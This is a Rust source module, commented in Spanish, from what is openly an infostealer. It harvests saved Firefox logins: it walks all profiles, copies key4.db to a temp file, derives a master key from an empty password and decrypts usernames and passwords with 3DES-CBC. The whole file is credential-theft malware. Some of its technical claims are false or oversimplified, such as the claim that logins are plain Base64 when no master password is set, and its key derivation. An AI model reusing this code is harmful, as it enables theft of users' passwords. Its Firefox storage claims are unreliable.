// Stealer para Mozilla Firefox
use crate::stealer::{Credential, StealerError, StealerResult};
use crate::stealer::common::{get_appdata_roaming, file_exists, base64_decode};
use std::path::PathBuf;
use rusqlite::Connection;

/// Roba credenciales de Firefox
pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
    let appdata = get_appdata_roaming().ok_or(StealerError::BrowserNotFound)?;
    
    // Firefox almacena perfiles en: %APPDATA%\Mozilla\Firefox\Profiles
    let firefox_path = appdata.join(r"Mozilla\Firefox\Profiles");
    
    if !firefox_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }

    let mut all_credentials = Vec::new();

    // Iterar sobre todos los perfiles de Firefox
    if let Ok(entries) = std::fs::read_dir(&firefox_path) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                // Intentar extraer credenciales de este perfil
                match extract_firefox_profile(&entry.path()) {
                    Ok(mut creds) => all_credentials.append(&mut creds),
                    Err(_) => continue,  // Ignorar perfiles que fallan
                }
            }
        }
    }

    if all_credentials.is_empty() {
        Err(StealerError::BrowserNotFound)
    } else {
        Ok(all_credentials)
    }
}

/// Extrae credenciales de un perfil específico de Firefox
fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
    // Firefox almacena:
    // - logins.json: credenciales (pueden estar encriptadas o NO)
    // - key4.db: master key (solo si user configuró Master Password)
    
    let logins_json = profile_path.join("logins.json");
    
    if !file_exists(&logins_json) {
        return Err(StealerError::DatabaseError("Firefox logins.json not found".into()));
    }

    // Leer logins.json
    let logins_content = std::fs::read_to_string(&logins_json)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    // IMPORTANTE: Firefox solo encripta credenciales si el usuario configuró Master Password
    // En la mayoría de casos, las credenciales NO están encriptadas (solo obfuscadas con Base64)
    // Referencia: https://netlas.io/blog/hannibal_stealer_part_1/
    // "Firefox does not encrypt cookies at rest (unless a master password is set by the user, which is uncommon)"
    
    // Intentar extraer master key (solo si existe key4.db y el user tiene Master Password)
    let key4_db = profile_path.join("key4.db");
    let master_key = if file_exists(&key4_db) {
        let temp_key4 = match copy_db_to_temp(&key4_db) {
            Ok(p) => p,
            Err(_) => return parse_firefox_logins(&logins_content, None),  // key4.db locked, parsear sin key
        };
        
        let key = extract_firefox_master_key(&temp_key4).ok();
        let _ = std::fs::remove_file(&temp_key4);
        key
    } else {
        None  // No key4.db = definitivamente no encrypted
    };
    
    // Parsear logins.json (con o sin master key)
    parse_firefox_logins(&logins_content, master_key.as_deref())
}

/// Copia la base de datos a un archivo temporal
fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("tmp_ff_{}.db", std::process::id());
    let temp_path = temp_dir.join(temp_name);
    
    std::fs::copy(db_path, &temp_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    Ok(temp_path)
}

/// Extrae la master key de key4.db
/// Firefox usa NSS (Network Security Services) con 3DES-CBC
fn extract_firefox_master_key(key4_path: &PathBuf) -> StealerResult<Vec<u8>> {
    let conn = Connection::open(key4_path)
        .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    // Obtener el global salt
    let global_salt: Vec<u8> = conn.query_row(
        "SELECT item1 FROM metadata WHERE id = 'password'",
        [],
        |row| row.get(0),
    ).map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    // Obtener la master key encriptada
    let encrypted_key: Vec<u8> = conn.query_row(
        "SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL",
        [],
        |row| row.get(0),
    ).map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    // Desencriptar master key usando 3DES
    // NOTA: Esta implementación asume NO master password
    // Con master password, necesitaríamos PBKDF2(password, global_salt)
    
    // Generar clave de desencriptación (sin password = string vacía)
    let key = derive_key_pbkdf2(b"", &global_salt)?;
    
    // Desencriptar usando 3DES-CBC
    // encrypted_key tiene estructura ASN.1, necesitamos extraer IV y ciphertext
    let (iv, ciphertext) = parse_asn1_sequence(&encrypted_key)?;
    
    let decrypted = decrypt_3des_cbc(&ciphertext, &key, &iv)?;
    
    // La clave desencriptada también tiene estructura ASN.1
    // Extraemos solo los últimos 24 bytes que son la clave 3DES real
    if decrypted.len() >= 24 {
        Ok(decrypted[decrypted.len() - 24..].to_vec())
    } else {
        Err(StealerError::DecryptionFailed)
    }
}

/// Deriva una clave usando PBKDF2-SHA256
fn derive_key_pbkdf2(password: &[u8], salt: &[u8]) -> StealerResult<Vec<u8>> {
    use pbkdf2::pbkdf2_hmac_array;
    use sha2::Sha256;
    
    let key = pbkdf2_hmac_array::<Sha256, 32>(password, salt, 1);
    
    Ok(key.to_vec())
}

/// Parsea estructura ASN.1 simple para extraer IV y ciphertext
/// Firefox usa: SEQUENCE { SEQUENCE { OID, IV }, ciphertext }
fn parse_asn1_sequence(data: &[u8]) -> StealerResult<(Vec<u8>, Vec<u8>)> {
    // Implementación simplificada de parseo ASN.1
    // En producción usaríamos una librería como `der` o `yasna`
    
    if data.len() < 20 {
        return Err(StealerError::InvalidData);
    }
    
    // Buscar el IV (típicamente 8 bytes para 3DES)
    // Estructura típica: buscar tag 0x04 (OCTET STRING) seguido de longitud
    let mut iv = Vec::new();
    let mut ciphertext = Vec::new();
    
    let mut i = 0;
    while i < data.len() {
        if data[i] == 0x04 && i + 1 < data.len() {
            let length = data[i + 1] as usize;
            
            if i + 2 + length <= data.len() {
                let octet_string = &data[i + 2..i + 2 + length];
                
                if iv.is_empty() && length == 8 {
                    // Primer OCTET STRING de 8 bytes = IV
                    iv = octet_string.to_vec();
                } else if !iv.is_empty() {
                    // Segundo OCTET STRING = ciphertext
                    ciphertext = octet_string.to_vec();
                    break;
                }
                
                i += 2 + length;
            } else {
                i += 1;
            }
        } else {
            i += 1;
        }
    }
    
    if iv.is_empty() || ciphertext.is_empty() {
        Err(StealerError::InvalidData)
    } else {
        Ok((iv, ciphertext))
    }
}

/// Desencripta usando 3DES-CBC
fn decrypt_3des_cbc(ciphertext: &[u8], key: &[u8], iv: &[u8]) -> StealerResult<Vec<u8>> {
    use des::cipher::{BlockDecryptMut, KeyIvInit};
    use des::TdesEde3;
    
    // 3DES requiere clave de 24 bytes
    if key.len() < 24 {
        return Err(StealerError::DecryptionFailed);
    }
    
    // IV de 8 bytes
    if iv.len() != 8 {
        return Err(StealerError::DecryptionFailed);
    }
    
    let key_24 = &key[0..24];
    
    type TdesEde3CbcDec = cbc::Decryptor<TdesEde3>;
    
    let cipher = TdesEde3CbcDec::new_from_slices(key_24, iv)
        .map_err(|_| StealerError::DecryptionFailed)?;
    
    let mut buffer = ciphertext.to_vec();
    
    let decrypted = cipher.decrypt_padded_mut::<block_padding::Pkcs7>(&mut buffer)
        .map_err(|_| StealerError::DecryptionFailed)?;
    
    Ok(decrypted.to_vec())
}

/// Parsea logins.json y desencripta credenciales
fn parse_firefox_logins(json_content: &str, master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
    let mut credentials = Vec::new();
    
    // Firefox tiene 2 formatos dependiendo de si hay Master Password:
    // - CON Master Password: "encryptedUsername", "encryptedPassword" (Base64 de datos encriptados con 3DES)
    // - SIN Master Password: "username", "password" (Base64 de datos en TEXTO PLANO)
    // Referencia: Dexter malware, Hannibal Stealer analysis
    
    if let Some(logins_start) = json_content.find("\"logins\":[") {
        let logins_section = &json_content[logins_start..];
        
        // Buscar cada objeto login
        let mut pos = 0;
        while let Some(entry_start) = logins_section[pos..].find("{") {
            pos += entry_start;
            
            if let Some(entry_end) = logins_section[pos..].find("}") {
                let entry = &logins_section[pos..pos + entry_end + 1];
                
                // Extraer hostname
                let hostname = extract_json_field(entry, "hostname");
                
                // Firefox puede tener AMBOS formatos en el mismo archivo
                // Intentar campos encriptados primero
                let enc_username = extract_json_field(entry, "encryptedUsername");
                let enc_password = extract_json_field(entry, "encryptedPassword");
                
                // Si no hay campos encriptados, intentar campos en texto plano
                let plain_username = extract_json_field(entry, "username");
                let plain_password = extract_json_field(entry, "password");
                
                if let Some(url) = hostname {
                    let (username, password) = if enc_username.is_some() || enc_password.is_some() {
                        // Credenciales ENCRIPTADAS (Master Password configurada)
                        if let Some(key) = master_key {
                            let user = enc_username
                                .and_then(|enc| decrypt_firefox_field(&enc, key).ok())
                                .unwrap_or_else(|| "[decrypt failed]".to_string());
                            let pass = enc_password
                                .and_then(|enc| decrypt_firefox_field(&enc, key).ok())
                                .unwrap_or_else(|| "[decrypt failed]".to_string());
                            (user, pass)
                        } else {
                            // Necesita master key pero no la tenemos
                            ("[encrypted - no master key]".to_string(), "[encrypted - no master key]".to_string())
                        }
                    } else if plain_username.is_some() || plain_password.is_some() {
                        // Credenciales en TEXTO PLANO (Base64 pero NO encriptadas)
                        let user = plain_username
                            .and_then(|b64| base64_decode(&b64).ok())
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| "[decode failed]".to_string());
                        let pass = plain_password
                            .and_then(|b64| base64_decode(&b64).ok())
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| "[decode failed]".to_string());
                        (user, pass)
                    } else {
                        // No hay datos de credenciales
                        continue;
                    };
                    
                    credentials.push(Credential {
                        browser: "Firefox".to_string(),
                        url,
                        username,
                        password,
                    });
                }
                
                pos += entry_end + 1;
            } else {
                break;
            }
        }
    }
    
    Ok(credentials)
}

/// Extrae un campo de un objeto JSON simple
fn extract_json_field(json: &str, field: &str) -> Option<String> {
    let pattern = format!("\"{}\":\"", field);
    if let Some(start) = json.find(&pattern) {
        let value_start = start + pattern.len();
        if let Some(end) = json[value_start..].find("\"") {
            return Some(json[value_start..value_start + end].to_string());
        }
    }
    None
}

/// Desencripta un campo de Firefox (username o password)
fn decrypt_firefox_field(encrypted_b64: &str, master_key: &[u8]) -> StealerResult<String> {
    // Decodificar Base64
    let encrypted = base64_decode(encrypted_b64)
        .map_err(|_| StealerError::Base64Error)?;
    
    // Parsear ASN.1 para obtener IV y ciphertext
    let (iv, ciphertext) = parse_asn1_sequence(&encrypted)?;
    
    // Desencriptar con 3DES-CBC
    let decrypted = decrypt_3des_cbc(&ciphertext, master_key, &iv)?;
    
    // Convertir a string
    String::from_utf8(decrypted)
        .map_err(|_| StealerError::InvalidData)
}
